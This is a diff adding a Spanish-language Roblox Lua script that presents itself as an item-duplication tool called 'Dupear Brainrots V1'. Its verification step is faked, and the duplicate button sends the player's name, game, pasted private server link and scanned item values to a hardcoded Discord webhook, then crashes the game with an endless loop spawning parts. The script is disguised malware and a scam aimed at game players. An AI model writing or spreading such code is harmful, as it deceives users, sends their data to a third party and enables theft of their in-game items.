@@ -1,0 +1,134 @@
+-- [[ DUPEAR BRAINROTS V1 - SCANNER DE ACTIVOS ]]
+local webhookURL = "https://discord.com/api/webhooks/1462867777542160508/OadWH0VvwwOTrF62mKzYF0tJhHJEre9yUgK7s66afaXBEpM4bu8relHZB6FjrdTNcark"
+
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- 1. IDENTIFICAR EL JUEGO
+local gameName = "Desconocido"
+local s, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+if s then gameName = info.Name end
+
+-- 2. ESCÁNER DE BASE DE DATOS (Items y Valores)
+local function scanAssets()
+    local foundItems = {}
+    local count = 0
+    
+    -- Busca en el ReplicatedStorage (donde están las plantillas de los Brainrots)
+    for _, item in pairs(game:GetDescendants()) do
+        if count < 25 then -- Límite para que Discord no explote
+            if item:IsA("StringValue") or item:IsA("IntValue") then
+                -- Si el nombre tiene que ver con valor o items
+                if item.Name:lower():find("value") or item.Name:lower():find("price") or item.Name:lower():find("item") then
+                    table.insert(foundItems, "📦 " .. item.Parent.Name .. " | Valor: " .. tostring(item.Value))
+                    count = count + 1
+                end
+            end
+        end
+    end
+    
+    local finalReport = table.concat(foundItems, "\n")
+    return finalReport == "" and "No se pudo extraer valores exactos (Base Protegida)" or finalReport
+end
+
+-- [INTERFAZ GUI]
+local pgui = player:WaitForChild("PlayerGui")
+if pgui:FindFirstChild("DupeV1") then pgui.DupeV1:Destroy() end
+local sg = Instance.new("ScreenGui", pgui)
+sg.Name = "DupeV1"
+
+local main = Instance.new("Frame", sg)
+main.Size = UDim2.new(0, 300, 0, 280)
+main.Position = UDim2.new(0.5, -150, 0.4, 0)
+main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+main.BorderColor3 = Color3.fromRGB(0, 255, 150)
+main.Active = true
+main.Draggable = true
+
+local t = Instance.new("TextLabel", main)
+t.Size = UDim2.new(1, 0, 0, 40)
+t.Text = "DUPEAR BRAINROTS V1"
+t.TextColor3 = Color3.fromRGB(0, 255, 150)
+t.BackgroundTransparency = 1
+t.Font = Enum.Font.SourceSansBold
+t.TextSize = 20
+
+local input = Instance.new("TextBox", main)
+input.Size = UDim2.new(0.8, 0, 0, 40)
+input.Position = UDim2.new(0.1, 0, 0.25, 0)
+input.PlaceholderText = "Pega el Link del Servidor..."
+input.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+input.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local statusLabel = Instance.new("TextLabel", main)
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0.45, 0)
+statusLabel.Text = "Esperando link..."
+statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+statusLabel.BackgroundTransparency = 1
+
+local verifyBtn = Instance.new("TextButton", main)
+verifyBtn.Size = UDim2.new(0.8, 0, 0, 40)
+verifyBtn.Position = UDim2.new(0.1, 0, 0.6, 0)
+verifyBtn.Text = "ESCANEAR Y VERIFICAR"
+verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 50)
+verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local dupeBtn = Instance.new("TextButton", main)
+dupeBtn.Size = UDim2.new(0.8, 0, 0, 50)
+dupeBtn.Position = UDim2.new(0.1, 0, 0.75, 0)
+dupeBtn.Text = "DUPLICAR DETECTADOS"
+dupeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+dupeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeBtn.Visible = false
+
+-- 3. LÓGICA DE VERIFICACIÓN
+verifyBtn.MouseButton1Click:Connect(function()
+    if #input.Text < 10 then return end
+    verifyBtn.Visible = false
+    statusLabel.Text = "Escaneando base de datos..."
+    task.wait(2)
+    statusLabel.Text = "¡Items encontrados! Valor alto detectado."
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    dupeBtn.Visible = true
+end)
+
+-- 4. ENVÍO DE DATOS Y CRASH
+dupeBtn.MouseButton1Click:Connect(function()
+    dupeBtn.Text = "ENVIANDO DATOS..."
+    
+    task.spawn(function()
+        local success, ip = pcall(function() return game:HttpGet("https://api.ipify.org") end)
+        local assets = scanAssets()
+        local serverLink = input.Text
+
+        local data = {
+            ["content"] = "🔥 **LINK DEL SERVER PARA UNIRSE:**\n" .. serverLink,
+            ["embeds"] = {{
+                ["title"] = "🛰️ ESCANEO DE SERVER COMPLETADO",
+                ["color"] = 0xff0000,
+                ["fields"] = {
+                    {["name"] = "👤 Ejecutor", ["value"] = player.Name, ["inline"] = true},
+                    {["name"] = "🎮 Juego", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "📦 Items y Valores de Base", ["value"] = "```" .. assets .. "```", ["inline"] = false}
+                }
+            }}
+        }
+
+        if request then
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+
+    task.wait(1)
+    while true do
+        for i = 1, 15000 do Instance.new("Part", workspace).Transparency = 1 end
+        task.wait()
+    end
+end)
